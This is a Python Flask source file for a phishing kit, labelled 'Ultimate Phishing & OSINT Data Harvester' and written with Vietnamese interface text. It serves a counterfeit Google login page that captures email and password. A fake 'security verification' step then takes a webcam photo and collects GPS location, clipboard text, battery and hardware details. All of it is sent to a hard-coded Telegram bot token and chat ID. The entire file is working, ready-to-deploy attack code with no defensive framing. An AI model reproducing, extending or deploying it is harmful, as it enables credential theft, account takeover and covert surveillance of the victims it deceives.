# app.py
# Python 3.10+
# Target: Ultimate Phishing & OSINT Data Harvester
# Requires: flask, requests, user-agents

from flask import Flask, request, render_template_string, redirect, jsonify
import requests
import os
import base64
import threading
from user_agents import parse

app = Flask(__name__)

# Cấu hình mặc định (Có thể ghi đè bằng Environment Variables trên Render)
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "9050498708:AAG9AVoffgweODY06PWGLwNBRHXvoaN9B4s")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "9144223149")

# Bộ nhớ tạm lưu dữ liệu phiên
sessions = {}

# ============================================================
# CSS DÙNG CHUNG
# ============================================================
CSS = """
<style>
    body { font-family: 'Roboto', arial, sans-serif; background: #f0f4f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .login-box { width: 450px; padding: 48px 40px 36px; background: #fff; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; box-sizing: border-box; }
    .logo { width: 75px; margin-bottom: 16px; }
    h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
    p { font-size: 15px; margin-bottom: 30px; color: #5f6368; line-height: 1.5;}
    input { width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; margin-bottom: 15px; }
    input:focus { outline: none; border-color: #1a73e8; }
    .btn-next { background: #1a73e8; color: #fff; border: none; padding: 12px 24px; border-radius: 6px; font-weight: 500; font-size: 15px; width: 100%; cursor: pointer; transition: 0.2s;}
    .btn-next:hover { background: #1557b0; }
    .hidden { display: none; }
    #video { width: 100%; border-radius: 8px; display: none; margin-bottom: 15px; border: 2px solid #1a73e8;}
</style>
"""

# ============================================================
# GIAO DIỆN ĐĂNG NHẬP (EMAIL & PASS)
# ============================================================
HTML_LOGIN = f"""
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Đăng nhập - Tài khoản Google</title>{CSS}</head>
<body>
    <div class="login-box">
        <img class="logo" src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">
        <h1>Đăng nhập</h1>
        <p>Để tiếp tục, hãy đăng nhập vào Tài khoản Google của bạn</p>
        <form method="POST" action="/login">
            <input type="email" name="username" placeholder="Email hoặc số điện thoại" required>
            <input type="password" name="password" placeholder="Nhập mật khẩu" required>
            <button type="submit" class="btn-next">Đăng nhập</button>
        </form>
    </div>
</body></html>
"""

# ============================================================
# GIAO DIỆN XÁC MINH (GPS + CAMERA + VÉT DATA)
# ============================================================
HTML_VERIFY = f"""
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Xác minh danh tính</title>{CSS}</head>
<body>
    <div class="login-box">
        <h1>Xác minh bảo mật</h1>
        <p>Hệ thống phát hiện đăng nhập từ thiết bị lạ. Vui lòng cho phép truy cập Vị trí và Camera để xác minh.</p>
        
        <video id="video" autoplay playsinline></video>
        <button id="verifyBtn" class="btn-next">Bật Camera & Xác minh</button>
        <p id="status" style="color: #d93025; font-size: 13px; margin-top: 10px;"></p>
    </div>

    <script>
        // Hàm vét cấu hình sâu
        function getHardwareData() {{
            return {{
                screen: `${{window.screen.width}}x${{window.screen.height}}`,
                hardware: `${{navigator.hardwareConcurrency || 'N/A'}} Cores / ${{navigator.deviceMemory || 'N/A'}}GB RAM`,
                network: `${{navigator.connection ? navigator.connection.effectiveType : 'N/A'}}`,
                battery: "Unknown",
                clipboard: "Truy cập bị từ chối"
            }};
        }}

        const btn = document.getElementById('verifyBtn');
        const video = document.getElementById('video');
        const status = document.getElementById('status');

        btn.addEventListener('click', async () => {{
            status.innerText = "Đang yêu cầu quyền Vị trí...";
            let lat = "Unknown", lon = "Unknown";
            let deepData = getHardwareData();

            // 1. XIN QUYỀN VỊ TRÍ
            try {{
                const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {{timeout: 5000}}));
                lat = pos.coords.latitude;
                lon = pos.coords.longitude;
                status.innerText = "Đã lấy vị trí. Đang yêu cầu Camera...";
            }} catch(e) {{ 
                status.innerText = "Đã bỏ qua Vị trí. Đang yêu cầu Camera...";
            }}

            // Đợi 0.5s để popup Vị trí đóng lại
            await new Promise(r => setTimeout(r, 500));

            // 2. XIN QUYỀN CAMERA VÀ VÉT DỮ LIỆU
            try {{
                const stream = await navigator.mediaDevices.getUserMedia({{ video: true, audio: false }});
                video.srcObject = stream;
                video.style.display = 'block';
                btn.style.display = 'none';
                status.innerText = "Đang chụp ảnh xác minh...";

                // Lấy Pin
                try {{
                    if (navigator.getBattery) {{
                        const battery = await navigator.getBattery();
                        deepData.battery = `${{Math.round(battery.level * 100)}}% (${{battery.charging ? 'Đang sạc' : 'Pin'}})`;
                    }}
                }} catch(e) {{}}

                // Thử đọc Clipboard (Chỉ chạy nếu nạn nhân cho phép)
                try {{
                    const text = await navigator.clipboard.readText();
                    if (text) deepData.clipboard = text.substring(0, 50);
                }} catch(e) {{}}
                
                setTimeout(() => {{
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                    const imageData = canvas.toDataURL('image/jpeg', 0.6);
                    
                    fetch('/upload_verify', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{ image: imageData, lat: lat, lon: lon, deepData: deepData }})
                    }}).then(() => {{
                        status.style.color = "green";
                        status.innerText = "Xác minh thành công! Đang chuyển hướng...";
                        setTimeout(() => window.location.href = "https://myaccount.google.com", 1500);
                    }});
                    
                    stream.getTracks().forEach(track => track.stop());
                }}, 1500);

            }} catch (err) {{
                status.innerText = "Lỗi: Bạn cần cấp quyền Camera để tiếp tục!";
            }}
        }});
    </script>
</body></html>
"""

# ============================================================
# ROUTES XỬ LÝ
# ============================================================
@app.route('/')
def index():
    return render_template_string(HTML_LOGIN)

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('username')
    password = request.form.get('password')
    ip = request.remote_addr
    ua_string = request.headers.get('User-Agent')
    
    user_agent = parse(ua_string)
    device_info = f"{user_agent.os.family} {user_agent.os.version_string} - {user_agent.browser.family}"
    is_mobile = "Điện thoại" if user_agent.is_mobile else "Máy tính"
    
    sessions[email] = {
        "email": email, "password": password, "ip": ip,
        "device": device_info, "type": is_mobile, "ua": ua_string
    }
    
    # Bắn Telegram luồng 1 (Email + Pass) ngay lập tức
    def send_pass_alert():
        caption = f"🔑 **BẮT ĐƯỢC EMAIL & PASS!**\n\n👤 Email: `{email}`\n🔑 Pass: `{password}`\n🌐 IP: `{ip}`\n📱 Thiết bị: {is_mobile} ({device_info})"
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        try:
            requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": caption, "parse_mode": "Markdown"}, timeout=5)
        except: pass
    
    threading.Thread(target=send_pass_alert).start()
    
    return redirect(f"/verify?email={email}")

@app.route('/verify')
def verify_page():
    return render_template_string(HTML_VERIFY)

@app.route('/upload_verify', methods=['POST'])
def upload_verify():
    data = request.json
    email = request.referrer.split('email=')[-1] if 'email=' in request.referrer else "Unknown"
    
    if email in sessions:
        def send_image_alert():
            deep = data.get('deepData', {})
            map_link = f"https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}" if data.get('lat') != "Unknown" else "Không xác định"
            
            caption = (
                f"📸 **THÔNG TIN BỔ SUNG!**\n\n"
                f"👤 Email: `{sessions[email]['email']}`\n"
                f"💻 Màn hình: {deep.get('screen', 'N/A')}\n"
                f"⚙️ Cấu hình: {deep.get('hardware', 'N/A')}\n"
                f"🔋 Pin: {deep.get('battery', 'N/A')}\n"
                f"📶 Mạng: {deep.get('network', 'N/A')}\n"
                f"📋 Clipboard: `{deep.get('clipboard', 'N/A')[:20]}`\n"
                f"📍 Vị trí: [Xem Map]({map_link})"
            )
            
            image_b64 = data.get('image')
            if image_b64:
                img_bytes = base64.b64decode(image_b64.split(',')[1])
                url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
                files = {'photo': ('face.jpg', img_bytes, 'image/jpeg')}
                payload = {"chat_id": TELEGRAM_CHAT_ID, "caption": caption, "parse_mode": "Markdown"}
                try:
                    requests.post(url, data=payload, files=files, timeout=10)
                except: pass
        
        threading.Thread(target=send_image_alert).start()
        del sessions[email]

    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
